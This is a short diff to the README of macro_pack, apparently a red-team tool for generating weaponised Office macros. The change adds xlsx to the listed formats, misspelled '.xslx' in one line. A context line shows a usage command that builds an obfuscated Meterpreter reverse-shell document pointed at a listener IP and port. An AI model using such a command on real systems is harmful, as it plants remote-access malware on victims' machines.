@@ -47,7 +47,7 @@ Ms Office Supported formats are:
 * MS Word 97 (.doc)
 * MS Word (.docm, .docx)
 * MS Excel 97 (.xls)
-* MS Excel (.xlsm)
+* MS Excel (.xlsm, .xslx)
 * MS PowerPoint (.pptm)
 * MS Visio 97 (.vsd)
 * MS Visio (.vsdm)
@@ -282,7 +282,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
          
          
     -G, --generate=OUTPUT_FILE_PATH. Generates a file containing the macro. Will guess the format based on extension.
-        Supported Ms Office extensions are: doc, docm, docx, xls, xlsm, pptm, vsd, vsdm, mpp.
+        Supported Ms Office extensions are: doc, docm, docx, xls, xlsm, xlsx, pptm, vsd, vsdm, mpp.
         Note: Ms Office file generation requires Windows OS with right MS Office application installed.
         Supported scripts extensions are: vba, vbs, wsf, wsc, sct, hta.
     
